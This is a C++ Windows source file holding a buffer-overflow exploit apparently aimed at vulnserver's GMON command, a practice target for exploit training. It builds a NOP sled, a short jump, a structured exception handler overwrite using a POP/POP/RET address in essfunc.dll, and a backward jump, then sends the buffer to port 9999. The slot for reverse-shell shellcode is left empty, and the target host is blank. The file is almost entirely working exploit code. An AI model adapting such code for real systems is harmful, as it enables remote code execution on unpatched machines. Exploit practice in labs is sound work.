#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>


#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_PORT "9999"
#define DEFAULT_BUFLEN 512

void completionBuf(std::string& message,char ch, int number)
{
    for (int i = 0; i < number; ++i)
        message += ch;
}

int main(int argc, char* argv[])
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    std::string message = "GMON /";
    std::string reverseTCP =
        "";

    completionBuf(message, '\x90', ((3554 - reverseTCP.size() - 4) - 200));
    message += reverseTCP;
    completionBuf(message, '\x90', 200);
    message += "\xEB\x08\x90\x90";
    //       3554 calls SEH 
    //       0x6250172b,  // POP EDI // POP EBP // RETN [essfunc.dll]
    message += "\x2b\x17\x50\x62";
    //       010DFFD6  E9 0B F2 FF FF 90 90 90 90
    message += "\x90\x90\x90\x90\x90\xE9\x10\xf2\xff\xff\x90\x90\x90\x90";
    completionBuf(message, 'C', (5100 - (3554 - 4)));

    iResult = send(ConnectSocket, message.c_str(), message.size(), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "\nbytes send " << iResult << "\n\n";

    closesocket(ConnectSocket);
    WSACleanup();

    system("pause");
}